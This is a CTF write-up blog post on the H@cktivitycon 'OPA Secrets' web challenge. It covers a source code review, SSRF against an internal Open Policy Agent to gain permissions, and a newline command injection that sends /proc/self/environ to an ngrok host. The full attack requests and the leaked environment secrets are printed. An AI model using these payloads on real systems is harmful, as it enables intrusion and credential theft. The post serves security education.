---
layout: post
title: "H@cktivitycon Writeups: OPA Secrets"
image: ''
date:   2021-09-19 12:00:00
tags:
- h@cktivitycon
- web
- ssrf
- burpsuite
- command-injection
- code-review
description: ''
categories:
published: True
comments: false
---

![logo](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210918214829.png)

## Intro
I have devoted the past 48 hours to the **H@cktivitycon CTF**, run by [John Hammond](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw), [congon4tor](https://twitter.com/congon4tor?lang=en), [M_alpha](https://twitter.com/M_alphaaa), [fumenoid](https://twitter.com/fumenoid?lang=en), [NightWolf](https://twitter.com/nightwolf780), [Blacknote](https://twitter.com/BlacknoteSec), and [CalebStewart](https://twitter.com/calebjstewart), and boy howdy was it a great experience.

This post is dedicated to OPA Secrets, a hard challenge in the web category. I'll begin by walking through the web application to understand some of its functionality, and find a link to a GitHub repo containing source code. After doing a code review, I'll find a place to do SSRF, and the Open Policy Agent that manages permissions. Then, I'll leverage the SSRF vulnerability to modify my permissions so I can read the admin user's flag. In Beyond the Flag, I'll take a look at two unintended routes as a result of misconfiguration and bad filtering.

### Description
`OPA! Check out our new secret management service`

## Initial Recon
There is no downloadable content, so I'll deploy the website and be greeted with a login page.

Although I considered immediately going for a SQL injection, we are given the option to sign up, so I'll walkthrough the application as a normal user before I try and go for anything. Once we sign in, we see the main app.

![asdf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919202429.png)

### Main Page

![asdf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919202618.png)

After messing around on the landing page for a bit, we get a feeling for what the web app is doing. Users can create secret messages and share those with other users on the website.

![asdf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919202743.png)

Based on this, we find 3 users, `congon4tor`, `jellytalk`, and `pinkykoala`. I'll note these down in case they're necessary. It is at this point the idea of XSS entered my mind, possibly opening up a way to steal session cookies, but I found no indication that these users were interacting with the site at all, so I tabled that idea.

### User Settings
The user settings page was an interesting one. We're given the option to change our profile picture using the url of an image.

![adsf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919202821.png)

My first instinct was to see if this was potentially open to SSRF, so I tried to input some URLs to see if I could send requests to the server itself. As I'm writing this blog post a day later, the limited resources were making it harder to show these tests, but I was inclined to believe there was some kind of SSRF. However, without a real target to go after, I continued to explore the application, to possibly discover internal services (e.g. mySQL, Docker registry, etc.)

### Security Page
The security tab was the most straightforward of the pages. It has an announcement saying the webapp's code is public on GitHub.

![adsf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919203254.png)

No "Security through Obscurity"? In my CTF? That's crazy. Let's see what the source code has in store for us.

## Code Review
When I am given a git repository to look at, my first course of action is to look at the commit history, either from the GUI or using something like [GitTools](https://github.com/internetwache/GitTools), to look for some kind of sensitive data like keys, passwords, etc. While we do find passwords, they're not very useful since those users have the same privileges as we do. 

There's a decent chunk of code here, so I'm not going to go through it all, but I'll highlight 3 important segments.

- (Lines 1-20) The application is written in Python using the Flask framework, meaning many of our usual shell-related tricks won't work

```python  
import sys
from flask import (
    Flask,
    request,
    render_template,
    make_response,
    jsonify,
    abort,
    redirect,
    session,
)
import datetime
import base64
import json
import requests
import uuid
import os


app = Flask(__name__)
```

- (Lines 30-75) The 3 users we saw earlier are initialized, along with the secrets that they each have. It seems the flag is with `congon4tor`, the admin account.

```python  
def before_first_request():
    # Init all OPA things
    u = [
        {
            "id": "1822f21a-d720-4494-a31f-943bec140789",
            "username": "congon4tor",
            "role": "admin",
            "password": os.getenv("AMDIN_PASSWORD", "qwerty123"),
        },
        {
            "id": "243eae36-621a-47a6-b306-841bbffbcac4",
            "username": "jellytalk",
            "role": "user",
            "password": "test",
        },
        {
            "id": "9d6492e1-c73d-4231-add7-7ea285fc98a1",
            "username": "pinkykoala",
            "role": "user",
            "password": "test",
        },
    ]
    create_user(u[0]["id"], u[0]["username"], u[0]["role"], u[0]["password"])
    create_user(u[1]["id"], u[1]["username"], u[1]["role"], u[1]["password"])
    create_user(u[2]["id"], u[2]["username"], u[2]["role"], u[2]["password"])

    s = [
        {
            "id": "afce78a8-23d6-4f07-81f2-47c96ddb10cf",
            "name": "Flag",
            "value": os.getenv("FLAG", "TEST_FLAG"),
        },
        {
            "id": "d2e0704c-55a5-4a63-aad5-849798283da5",
            "name": "Test 1",
            "value": "test secret",
        },
        {
            "id": "491e16d2-fd2b-4965-bcb6-5931ef61ed5b",
            "name": "Test 2",
            "value": "test secret 2",
        },
    ]
    add_secret(s[0]["id"], s[0]["name"], s[0]["value"], u[0]["id"])
    add_secret(s[1]["id"], s[1]["name"], s[1]["value"], u[1]["id"])
    add_secret(s[2]["id"], s[2]["name"], s[2]["value"], u[2]["id"])
```

- (Lines 77-93) The Open Policy Agent's policies are created. We see certain internal endpoints that are used to manage permissions.

```python
    # Add policies
    headers = {
        "Content-Type": "text/plain",
    }
    payload = 'package access.read\n\ndefault allow_read = false\n\nallow_read {\n  data.users[input.user].role == "admin"\n}\n\nallow_read {\n  data.users[input.user].role == "user"\n  data.readers[input.secret][_] == input.user\n}\n'
    r = requests.put(
        url=f"http://localhost:8181/v1/policies/access/read",
        headers=headers,
        data=payload,
    )

    payload = 'package access.write\n\ndefault allow_write = false\n\nallow_write {\n  data.users[input.user].role == "admin"\n}\n\nallow_write {\n  data.users[input.user].role == "user"\n  data.writers[input.secret][_] == input.user\n}\n'
    r = requests.put(
        url=f"http://localhost:8181/v1/policies/access/write",
        headers=headers,
        data=payload,
    )
```

There's definitely more code that's relevant, but these are the major pieces.

## Grabbing the Flag
Returning to the application, we attempt to leverage the SSRF to query the OPA and give ourselves permissions to read the flag. A quick glance at the code will tell us how it runs.

```python
@app.route("/updateSettings", methods=["POST"])
def updateSettings():

    url = request.form.get("url")
    if not url:
        return redirect("settings?error=Missing parameters")

    if not session.get("id", None):
        return redirect("/signin?error=Please sign in")
    user_id = session.get("id")
    user = get_user(user_id)
    if not user:
        return redirect("/signin?error=Invalid session")

    if (
        ";" in url
        or "`" in url
        or "$" in url
        or "(" in url
        or "|" in url
        or "&" in url
        or "<" in url
        or ">" in url
    ):
        return redirect("settings?error=Invalid character")

    cmd = f"curl --request GET {url} --output ./static/images/{user['id']} --proto =http,https"
    status = os.system(cmd)
    if status != 0:
        return redirect("settings?error=Error fetching the image")

    user["picture"] = user_id

    return redirect("settings?success=Successfully updated the profile picture")
```

Seems like we're just running a curl command on the system, and there's nothing stopping us from querying the endpoint. Let's test that to make sure.

![adsf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919203820.png)

Very cool. Now, I'll inject my own curl request into the request so I canmake the same request the app would normally use to change permissions, using my own user id which I can find by using Inspect. I'm using Burp's Repeater feature for ease of sending multiple requests.

```
POST /updateSettings HTTP/1.1
Host: challenge.ctf.games:32168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://challenge.ctf.games:32168
Connection: close
Referer: http://challenge.ctf.games:32168/settings
Cookie: csrftoken=iFi0i9PTYhqIiYAb8k2mBzDgkR5dh9MU17ELV25PKZDDtLIE1EmFZBh7EEvcqJ67; session=eyJpZCI6IjE5MmY4Y2FiLWE3MmQtNGM5Yi05YWY4LTJjYzliOGQzN2M2YSJ9.YUfjKw.N60bWaU_T3JEoTPWq4ALUa52gKY
Upgrade-Insecure-Requests: 1

url=--request+POST+http%3A%2F%2Flocalhost%3A8181%2Fv1%2Fdata%2Faccess%2Fwrite+--data-raw+%27%7B%22input%22%3A%7B%22user%22%3A%22192f8cab-a72d-4c9b-9af8-2cc9b8d37c6a%22%2C%22secret%22%3A%22afce78a8-23d6-4f07-81f2-47c96ddb10cf%22%7D%7D%27
```

If you decode the data in the request, you'll see that we're mimicking what we saw in the code to allow our own user to get write permissions. After this, I can directly request the flag, using the same request we used when viewing the secret we created earlier.

![asdf](https://an00brektn.github.io/img/h@cktivity2021/Pasted image 20210919204242.png)

Thank you congon4tor for putting out the "correct" solution even though half of us skipped it :)

## Beyond the Flag
When I was originally solving this challenge, I did not use the SSRF at all, although I did notice it could be used. The first unintended solution we'll explore is a case of Broken Access Control with requests to the OPA. The second unintended solution has to do with the curl request that's being directly called from the machine, which has insufficient filtering.

### Burp Shenanigans
My original solution to this challenge was the final step of the intended solution. There didn't seem to be any checks for requesting another user's secret as long as you had the id. I'd post a screenshot, but I think you get the point. My best guess, based on was congon4tor was saying in chat, was an update to the Open Policy Agent system that caused a change in how the interaction was managed. Needless to say, it bypasses most of this challenge.

### Command Injection
The command injection unintended solution is kind of similar to another challenge in this CTF, Availability. Although our input in the "Update Profile" page gets placed directly into the curl command, the page response is just whether or not the command was successful. The easy way to show this is reading what's stored in the profile image file (again, look back at the code for this), but I will explore this with [ngrok](https://ngrok.com/).

The code contains a filter for specific special characters.
```python
if (
        ";" in url
        or "`" in url
        or "$" in url
        or "(" in url
        or "|" in url
        or "&" in url
        or "<" in url
        or ">" in url
    ):
        return redirect("settings?error=Invalid character")

    cmd = f"curl --request GET {url} --output ./static/images/{user['id']} --proto =http,https"
    status = os.system(cmd)
    if status != 0:
        return redirect("settings?error=Error fetching the image")
```

Bypassing the filter is not that hard. A Discord user (acut3#1039) showed me this input:
```bash
%0Acurl http://... --data-binary '@/proc/self/environ' #
```

In the source code, the flag was originally pulled from an environment variable. This injection essentially sends out a POST request with the environment variable values in it. The only problem is I need some way to recieve that information, and I'm not about to set up an apache server on my Kali machine.

Luckily, I found [this gist](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) on Github for a Python webserver I can start up to log those requests. Since I'm working out of a VM that I keep on a NAT network for security reasons, I can start a webserver with Python, and then tunnel outsider traffic to my VM using ngrok and grab the flag. 

We send the following request.
```
POST /updateSettings HTTP/1.1
Host: challenge.ctf.games:32168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Origin: http://challenge.ctf.games:32168
Connection: close
Referer: http://challenge.ctf.games:32168/settings
Cookie: csrftoken=iFi0i9PTYhqIiYAb8k2mBzDgkR5dh9MU17ELV25PKZDDtLIE1EmFZBh7EEvcqJ67; session=eyJpZCI6IjE5MmY4Y2FiLWE3MmQtNGM5Yi05YWY4LTJjYzliOGQzN2M2YSJ9.YUfjKw.N60bWaU_T3JEoTPWq4ALUa52gKY
Upgrade-Insecure-Requests: 1

url=%0Acurl http://[REDACTED].ngrok.io --data-binary '@/proc/self/environ' #
```

And on our webserver, we see this.
```
INFO:root:POST request,
Path: /
Headers:
Host: [REDACTED].ngrok.io
User-Agent: curl/7.79.0
Content-Length: 969
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 104.198.220.12
X-Forwarded-Proto: http
Accept-Encoding: gzip

Body:
KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://10.116.0.1:443UWSGI_ORIGINAL_PROC_NAME=uwsgiHOSTNAME=opa-secrets-507ebc9dc99cab12-7964f68997-fsbpcPYTHON_PIP_VERSION=21.0.1SHLVL=1HOME=/rootGPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/4be3fe44ad9dedc028629ed1497052d65d281b8e/get-pip.pyAMDIN_PASSWORD=cegJBSPsR+c7UtCcH6fArJ6Mp8mwCkaGnT71QxgVijoKUBERNETES_PORT_443_TCP_ADDR=10.116.0.1PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpLANG=C.UTF-8PYTHON_VERSION=3.8.7KUBERNETES_PORT_443_TCP=tcp://10.116.0.1:443KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_SERVICE_HOST=10.116.0.1PWD=/usr/src/appPYTHON_GET_PIP_SHA256=8006625804f55e1bd99ad4214fd07082fee27a1c35945648a58f9087a714e9d4COOKIE_SECRET=Mp8egJBSPsR+cxgViGnTcfArjo7UtCcH6mwCkaJ671QUWSGI_RELOADS=0FLAG=flag{589882d62d1c899d8b85db1af2076b39}

127.0.0.1 - - [19/Sep/2021 20:46:36] "POST / HTTP/1.1" 200 -
```

And that's the flag.